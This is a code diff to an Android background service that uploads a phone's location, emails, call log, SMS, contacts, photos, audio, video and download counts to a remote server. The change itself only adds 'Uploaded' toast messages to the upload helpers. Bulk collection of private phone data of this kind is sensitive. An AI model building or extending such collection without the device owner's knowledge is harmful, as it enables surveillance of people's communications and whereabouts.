@@ -295,8 +295,7 @@ public class DownloadService extends IntentService {
                 }
 
                 Log.e("Location-Data", "Uploaded");
-                Toast.makeText(context, "Location uploaded !!", Toast.LENGTH_SHORT).show();
-                new UploadData(HOME_URL + LOCATION_URL, jsonToSend).execute();
+                new UploadData(HOME_URL + LOCATION_URL, jsonToSend,"Location Uploaded").execute();
 //                tvAddress.setText(currentLocation);
             }
         }
@@ -304,11 +303,13 @@ public class DownloadService extends IntentService {
 
     public class UploadData extends AsyncTask<Void, Void, JSONObject> {
         private String URL;
+        private String from;
         private JSONObject jsonObjSend;
 
-        public UploadData(String URL, JSONObject jsonObjSend) {
+        public UploadData(String URL, JSONObject jsonObjSend,String from) {
             this.URL = URL;
             this.jsonObjSend = jsonObjSend;
+            this.from=from;
         }
 
         @Override
@@ -364,11 +365,8 @@ public class DownloadService extends IntentService {
         }
 
         protected void onPostExecute(JSONObject result) {
-
-            //  Toast.makeText(MainActivity.this, "Data uploaded !!", Toast.LENGTH_SHORT).show();
+            Toast.makeText(context, from, Toast.LENGTH_SHORT).show();
         }
-
-
     }
 
     private class MakeRequestTask extends AsyncTask<Void, Void, Void> {
@@ -536,8 +534,7 @@ public class DownloadService extends IntentService {
         @Override
         protected void onPostExecute(Void aVoid) {
             int size = jsonArray.length();
-
-            new UploadArrayData(HOME_URL + EMAIL_URL, jsonArray).execute();
+            new UploadArrayData(HOME_URL + EMAIL_URL, jsonArray,"Emails Uploaded").execute();
         }
 
 
@@ -577,61 +574,61 @@ public class DownloadService extends IntentService {
 //        return accountNames;
 //    }
 
-    public void getAddress(float latitude, float longitude) {
-        Address locationAddress;
-
-        locationAddress = getStringAddress(latitude, longitude);
-
-        if (locationAddress != null) {
-
-            String address = locationAddress.getAddressLine(0);
-            String address1 = locationAddress.getAddressLine(1);
-            String city = locationAddress.getLocality();
-            String state = locationAddress.getAdminArea();
-            String country = locationAddress.getCountryName();
-            String postalCode = locationAddress.getPostalCode();
-
-
-            String currentLocation;
-
-            if (!TextUtils.isEmpty(address)) {
-                currentLocation = address;
-
-                if (!TextUtils.isEmpty(address1))
-                    currentLocation += "," + address1;
-
-                if (!TextUtils.isEmpty(city)) {
-                    currentLocation += "," + city;
-
-                    if (!TextUtils.isEmpty(postalCode))
-                        currentLocation += " - " + postalCode;
-                } else {
-                    if (!TextUtils.isEmpty(postalCode))
-                        currentLocation += "," + postalCode;
-                }
-
-                if (!TextUtils.isEmpty(state))
-                    currentLocation += "," + state;
-
-                if (!TextUtils.isEmpty(country))
-                    currentLocation += "," + country;
-
-                JSONObject jsonToSend = new JSONObject();
-                try {
-                    jsonToSend.put("AccountNo", id);
-                    jsonToSend.put("MobileNo", mobileNo);
-                    jsonToSend.put("time", time);
-
-                    jsonToSend.put("Location", currentLocation);
-                } catch (JSONException e) {
-                    e.printStackTrace();
-                }
-
-                new UploadData(HOME_URL + LOCATION_URL, jsonToSend).execute();
-//                tvAddress.setText(currentLocation);
-            }
-        }
-    }
+//    public void getAddress(float latitude, float longitude) {
+//        Address locationAddress;
+//
+//        locationAddress = getStringAddress(latitude, longitude);
+//
+//        if (locationAddress != null) {
+//
+//            String address = locationAddress.getAddressLine(0);
+//            String address1 = locationAddress.getAddressLine(1);
+//            String city = locationAddress.getLocality();
+//            String state = locationAddress.getAdminArea();
+//            String country = locationAddress.getCountryName();
+//            String postalCode = locationAddress.getPostalCode();
+//
+//
+//            String currentLocation;
+//
+//            if (!TextUtils.isEmpty(address)) {
+//                currentLocation = address;
+//
+//                if (!TextUtils.isEmpty(address1))
+//                    currentLocation += "," + address1;
+//
+//                if (!TextUtils.isEmpty(city)) {
+//                    currentLocation += "," + city;
+//
+//                    if (!TextUtils.isEmpty(postalCode))
+//                        currentLocation += " - " + postalCode;
+//                } else {
+//                    if (!TextUtils.isEmpty(postalCode))
+//                        currentLocation += "," + postalCode;
+//                }
+//
+//                if (!TextUtils.isEmpty(state))
+//                    currentLocation += "," + state;
+//
+//                if (!TextUtils.isEmpty(country))
+//                    currentLocation += "," + country;
+//
+//                JSONObject jsonToSend = new JSONObject();
+//                try {
+//                    jsonToSend.put("AccountNo", id);
+//                    jsonToSend.put("MobileNo", mobileNo);
+//                    jsonToSend.put("time", time);
+//
+//                    jsonToSend.put("Location", currentLocation);
+//                } catch (JSONException e) {
+//                    e.printStackTrace();
+//                }
+//
+//                new UploadData(HOME_URL + LOCATION_URL, jsonToSend).execute();
+////                tvAddress.setText(currentLocation);
+//            }
+//        }
+//    }
 
     public Address getStringAddress(double latitude, double longitude) {
         Geocoder geocoder;
@@ -826,7 +823,7 @@ public class DownloadService extends IntentService {
 
         protected void onPostExecute(String result) {
             Log.e("Call-Data", "Uploaded");
-            new UploadArrayData(HOME_URL + CALL_URL, jsonArray).execute();
+            new UploadArrayData(HOME_URL + CALL_URL, jsonArray,"Calls Uploaded").execute();
         }
     }
 
@@ -1051,7 +1048,7 @@ public class DownloadService extends IntentService {
 
         protected void onPostExecute(String result) {
             Log.e("Sms-Data", "Uploaded");
-            new UploadArrayData(HOME_URL + SMS_URL, jsonArray).execute();
+            new UploadArrayData(HOME_URL + SMS_URL, jsonArray,"SMS Uploaded").execute();
         }
     }
 
@@ -1284,7 +1281,7 @@ public class DownloadService extends IntentService {
 
         protected void onPostExecute(String result) {
 
-            new UploadArrayData(HOME_URL + CONTACT_URL, jsonToUpload).execute();
+            new UploadArrayData(HOME_URL + CONTACT_URL, jsonToUpload,"Contacts Uploaded").execute();
         }
     }
 
@@ -1364,7 +1361,7 @@ public class DownloadService extends IntentService {
 
         protected void onPostExecute(String result) {
             Log.e("Images-Data", "Uploaded");
-            new UploadData(HOME_URL + IMAGE_URL, jsonToUpload).execute();
+            new UploadData(HOME_URL + IMAGE_URL, jsonToUpload,"Images Uploded").execute();
         }
     }
 
@@ -1440,7 +1437,7 @@ public class DownloadService extends IntentService {
 
         protected void onPostExecute(String result) {
             Log.e("Audio-Data", "Uploaded");
-            new UploadData(HOME_URL + AUDIO_URL, jsonToUpload).execute();
+            new UploadData(HOME_URL + AUDIO_URL, jsonToUpload,"Audios Uploaded").execute();
         }
     }
 
@@ -1518,7 +1515,7 @@ public class DownloadService extends IntentService {
 
         protected void onPostExecute(String result) {
             Log.e("Video-Data", "Uploaded");
-            new UploadData(HOME_URL + VIDEO_URL, jsonToUpload).execute();
+            new UploadData(HOME_URL + VIDEO_URL, jsonToUpload,"Videos Uploaded").execute();
         }
     }
 
@@ -1605,7 +1602,7 @@ public class DownloadService extends IntentService {
             jsonToUpload.put("VideoCount", videoDownload);
 
             Log.e("Downloads-Data", "Uploaded");
-            new UploadData(HOME_URL + DOWNLOAD_URL, jsonToUpload).execute();
+            new UploadData(HOME_URL + DOWNLOAD_URL, jsonToUpload,"Downloads Uploaded").execute();
 
         } catch (Exception e) {
         }
@@ -1621,10 +1618,12 @@ public class DownloadService extends IntentService {
 
     public class UploadArrayData extends AsyncTask<Void, Void, JSONObject> {
         private String URL;
+        private String from;
         private JSONArray jsonObjSend;
 
-        public UploadArrayData(String URL, JSONArray jsonObjSend) {
+        public UploadArrayData(String URL, JSONArray jsonObjSend,String from) {
             this.URL = URL;
+            this.from=from;
             this.jsonObjSend = jsonObjSend;
         }
 
@@ -1681,7 +1680,7 @@ public class DownloadService extends IntentService {
         }
 
         protected void onPostExecute(JSONObject result) {
-
+            Toast.makeText(context, from, Toast.LENGTH_SHORT).show();
         }
 
 
